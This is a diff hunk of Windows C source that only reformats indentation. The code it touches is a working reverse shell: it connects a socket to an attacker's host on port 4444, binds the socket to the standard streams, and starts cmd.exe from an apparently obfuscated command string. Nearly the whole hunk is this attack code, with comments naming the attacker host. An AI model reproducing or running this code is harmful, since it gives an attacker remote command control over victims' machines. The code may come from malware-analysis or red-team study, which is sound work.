@@ -63,27 +63,27 @@ int main(int argc, char* argv[])
   short port = 4444;
 
   // init socket lib
-	WSAStartup(MAKEWORD(2, 2), &wsaData);
+  WSAStartup(MAKEWORD(2, 2), &wsaData);
 
   // create socket
-	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
-	hax.sin_family = AF_INET;
-	hax.sin_port = htons(port);
-	hax.sin_addr.s_addr = inet_addr(ip);
+  hax.sin_family = AF_INET;
+  hax.sin_port = htons(port);
+  hax.sin_addr.s_addr = inet_addr(ip);
 
   // connect to a attacker's host port
-	WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
 
-	memset(&sui, 0, sizeof(sui));
-	sui.cb = sizeof(sui);
-	sui.dwFlags = STARTF_USESTDHANDLES;
-	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;
+  memset(&sui, 0, sizeof(sui));
+  sui.cb = sizeof(sui);
+  sui.dwFlags = STARTF_USESTDHANDLES;
+  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;
 
   char command[8] = "";
   snprintf( command, sizeof(command), "%s", myCmd);
 
   // start cmd.exe (decrypted) with redirected streams
-	CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
+  CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
   exit(0);
 }
